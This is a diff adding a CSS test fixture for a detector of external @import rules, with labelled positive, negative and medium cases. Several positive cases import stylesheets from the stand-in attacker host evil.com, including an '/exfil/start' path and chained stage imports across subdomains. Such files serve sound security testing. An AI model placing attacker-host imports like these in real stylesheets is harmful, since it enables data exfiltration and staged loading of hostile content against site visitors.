@@ -1,0 +1,21 @@
+/* TC-IC-01: POSITIVE — single external import */
+@import 'https://evil.com/exfil/start';
+
+/* TC-IC-02: POSITIVE — 3 imports to same domain (chaining pattern) */
+@import url('https://evil.com/stage1');
+@import url('https://evil.com/stage2');
+@import url('https://evil.com/stage3');
+
+/* TC-IC-03 is tested by adding more imports to different domains — see below */
+@import 'https://cdn-a.evil.com/step1';
+@import 'https://cdn-b.evil.com/step2';
+@import 'https://cdn-c.evil.com/step3';
+@import 'https://cdn-d.evil.com/step4';
+@import 'https://cdn-e.evil.com/step5';
+
+/* TC-IC-04: NEGATIVE — local import */
+@import 'reset.css';
+@import 'variables.css';
+
+/* TC-IC-05: MEDIUM — Google Fonts is common but still flagged as external */
+@import url('https://fonts.googleapis.com/css?family=Roboto');
